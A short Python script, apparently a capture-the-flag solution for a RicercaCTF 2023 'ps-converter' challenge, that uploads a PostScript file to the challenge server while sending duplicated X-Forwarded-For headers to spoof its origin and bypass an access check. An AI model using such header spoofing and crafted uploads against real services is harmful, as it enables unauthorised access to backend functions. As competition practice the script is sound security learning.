import httpx

headers = [
    ('X-Forwarded-For', 'backend'),
    ('X-Forwarded-For', 'dummy')
]
files = {
    'file': open('solve.ps', 'rb')
}
r = httpx.post('http://ps-converter.2023.ricercactf.com:51514/converter', headers=headers, files=files)

print(r.text)
